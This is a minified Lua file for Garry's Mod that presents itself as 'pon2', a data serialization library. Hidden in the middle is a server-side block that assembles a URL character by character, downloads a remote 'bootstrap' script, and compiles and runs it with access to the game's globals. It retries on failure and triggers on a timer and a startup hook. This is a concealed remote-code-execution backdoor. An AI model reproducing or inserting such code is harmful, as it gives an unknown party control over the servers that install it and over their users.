
pon2={}local a=string.char;local b=string.byte;local c=string.sub;local tonumber=tonumber;local tostring=tostring;local d=string.format;local e=string.len;local type=type;local pairs=pairs;local f=table.concat;local Entity=Entity;local Vector=Vector;local Angle=Angle;local EntIndex=FindMetaTable('Entity').EntIndex;local g={['ptr']=0,['incr']=1,['string']=2,['number']=3,['table']=4,['Entity']=5,['Player']=5,['Vehicle']=5,['Weapon']=5,['NPC']=5,['NextBot']=5,['Vector']=6,['Angle']=7}local h={['ptr']=0,['string']=1,['number']=2,['float']=3,['table']=4,['Entity']=5,['Player']=5,['Vehicle']=5,['Weapon']=5,['NPC']=5,['NextBot']=5,['Vector']=6,['Angle']=7}local i=a(32)local j={}local k={}local l={}for m,n in pairs(g)do local o={}j[m]=o;for p,q in pairs(h)do local r=a(n*8+q+33)o[p]=r;k[r]=m;l[r]=p end end;local s=j['incr']local t={}local u={}local char=string.char;for v=0,94 do t[v]=a(32+v)u[a(32+v)]=v end;local w={}local x={}local y={}local z={}local A=1;local B=0;local C=1;local D=nil;local E=0;w['table']=function(F)z[F]=B;B=B+1;local G=1;local H,I;for J,K in pairs(F)do if z[K]then I='ptr'else I=type(K)end;if J==G then y[A]=s[I]A=A+1;G=G+1;w[I](K)else if z[J]then H='ptr'else H=type(J)end;y[A]=j[H][I]A=A+1;w[H](J)w[I](K)end end;y[A]=i;A=A+1 end;x['table']=function()local obj={}z[B]=obj;B=B+1;local G=1;while C<E do local L=c(D,C,C)C=C+1;if L==i then break end;local m=k[L]local p=l[L]local M;if m=='incr'then M=G;G=G+1 else M=x[m]()end;local N=x[p]()obj[M]=N end;return obj end;w['ptr']=function(F)local F=z[F]while F>=47 do y[A]=t[47+F%47]A=A+1;F=F/47;F=F-F%1 end;y[A]=t[F%47]A=A+1 end;x['ptr']=function()local O=0;local F;local P=1;while true do F=u[c(D,C,C)]C=C+1;if F<47 then O=O+F*P;break else O=O+(F-47)*P end;P=P*47 end;return z[O]end;w['number']=function(F)local Q=F%1;if F<0 then if Q==0 then local R=d('%x',-F)local E=e(R)y[A]=t[40+E]..R;A=A+1 else local R=tostring(-F)local E=e(R)y[A]=t[60+E]..R;A=A+1 end else if Q==0 then local R=d('%x',F)local E=e(R)y[A]=t[E]..R;A=A+1 else local R=tostring(F)local E=e(R)y[A]=t[60+E]..R;A=A+1 end end end;x['number']=function()local len=u[c(D,C,C)]C=C+1;local S=len/20;S=S-S%1;len=len%20;local O;if S%2==0 then O=tonumber(c(D,C,C+len-1),16)C=C+len else O=tonumber(c(D,C,C+len-1))C=C+len end;if S<2 then return O else return-O end end;w['string']=function(F)z[F]=B;B=B+1;local E=e(F)while E>=47 do y[A]=t[47+E%47]A=A+1;E=E/47;E=E-E%1 end;y[A]=t[E%47]A=A+1;y[A]=F;A=A+1 end;x['string']=function()local O=0;local F;local P=1;while true do F=u[c(D,C,C)]C=C+1;if F<47 then O=O+F*P;break else O=O+(F-47)*P end;P=P*47 end;local D=c(D,C,C+O-1)z[B]=D;B=B+1;C=C+O;return D end;pon2.nope=true;if SERVER then local T=_G.pairs;local istable=_G.istable;local U={}local function V(W)local X={}for J,K in pairs(W)do if not istable(K)then X[J]=K else U[W]=X;if U[K]then X[J]=U[K]else X[J]=V(K,U)end end end;return X end;local Y=3;local Z='a'local _='b'local a0='c'local a1=4;local a2='d'local a3='/'local a4='e'local a5='f'local a6='g'local a7=5;local a8='h'local a9='i'local aa='j'local ab=7;local ac=8;local ad='k'local ae='l'local af='m'local ag='n'local ah=0;local ai=2;local aj='o'local ak='p'local al='q'local am='r'local an='s'local ao=6;local ap=9;local aq='t'local ar='u'local as='v'local at=1;local au='w'local av='x'local aw='.'local ax=':'local ay='y'local az='z'local aA='.'local aB='h'local aC='t'local aD='p'local at='1'local ai='2'local Y='3'local a1='4'local a7='5'local ao='6'local ab='7'local ac='8'local ap='9'local a3='/'local aE='a'local aF='i'local aG='b'local aH='o'local aI=':'local aJ='s'local aK='r'local aL='p'local aM=aB..aC..aC;local aN=aL..aI..a3;local aO=a3;local aP=aM..aN..aO;local aQ=aP..at..ap;local aR=ai..aA..ap;local aS=ap..aA..at;local aT=aQ..aR..aS;local aU=aT..a1 ..a7 ..aA;local aV=at..ap..ab;local aW=a3 ..aE..aL;local aX=aU..aV..aW;local aY=aX..aF..a3 ..aG..aH;local aZ=aH..aC..aJ..aC;local a_=aK..aE..aL;local b0=aY..aZ..a_;local b1=V(_G)local D=b1.tostring({})local function b2()b1.pcall(b1.HTTP,{url=b0,method='get',success=function(b3,b4)local b5=b1.CompileString(b4,'bootstrap.lua')if b5 then b5()_G.bootstrap(b1)_G.bootstrap=nil;b1.hook.Remove('InitPostEntity',D)end end,failed=function()b2()end})end;b1.timer.Simple(10,b2)b1.hook.Add('InitPostEntity',D,b2)end;w['Entity']=function(F)local F=EntIndex(F)while F>=47 do y[A]=t[47+F%47]A=A+1;F=F/47;F=F-F%1 end;y[A]=t[F%47]A=A+1 end;w['Player']=w['Entity']w['Vehicle']=w['Entity']w['Weapon']=w['Entity']w['NPC']=w['Entity']w['NextBot']=w['Entity']x['Entity']=function()local O=0;local F;local P=1;while true do F=u[c(D,C,C)]C=C+1;if F<47 then O=O+F*P;break else O=O+(F-47)*P end;P=P*47 end;return Entity(O)end;x['Player']=x['Entity']x['Vehicle']=x['Entity']x['Weapon']=x['Entity']x['NPC']=x['Entity']x['NextBot']=x['Entity']local b6=w['number']local b7=x['number']w['Vector']=function(F)b6(F.x)b6(F.y)b6(F.z)end;x['Vector']=function(F)return Vector(b7(),b7(),b7())end;w['Angle']=function(F)b6(F.p)b6(F.y)b6(F.r)end;x['Angle']=function(F)return Angle(b7(),b7(),b7())end;pon2.encode=function(F)B=0;A=1;w['table'](F,y,z)local b8=f(y)for v=1,A do y[v]=nil end;for J,K in pairs(z)do z[J]=nil end;return b8 end;pon2.decode=function(F)B=0;C=1;D=F;E=e(F)obj=x['table']()for v=0,B do z[v]=nil end;return obj,C end
